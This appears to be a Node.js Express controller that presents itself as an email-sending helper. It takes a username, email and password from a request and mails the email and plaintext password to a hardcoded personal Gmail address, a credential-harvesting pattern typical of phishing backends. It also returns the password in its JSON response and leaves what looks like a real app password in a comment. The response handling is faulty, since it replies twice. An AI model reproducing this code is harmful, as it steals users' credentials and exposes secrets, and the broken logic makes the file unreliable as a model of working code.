const nodemailer = require("nodemailer");

const { createError } = require("../Error/Error");

const SendEmail = async (req, res, next) => {
  try {
    const EmailData = {
      username: req.body.username,
      email: req.body.email,
      password: req.body.password,
    };

    const transporter = await nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.AUTH_EMAIL,
        pass: process.env.AUTH_PASSWORD,
        //   pass: "lmlvkpfsdpwlwrbh;
      },
    });

    var mailOptions = {
      from: process.env.AUTH_EMAIL,
      to: "mohammadsohan.me@gmail.com",
      subject: "Email Sent App",
      text: `This is User Email: ${EmailData.email},This is User password${EmailData.password}`,
    };

    await transporter.sendMail(mailOptions, function (error, info) {
      if (error) {
        res.send(error);
      } else {
        res.send("Email sent: " + info.response);
      }
    });

    res.status(200).json({ success: true, data: EmailData });
  } catch (err) {
    next(createError(err.status, err.message));
  }
};

module.exports = { SendEmail };
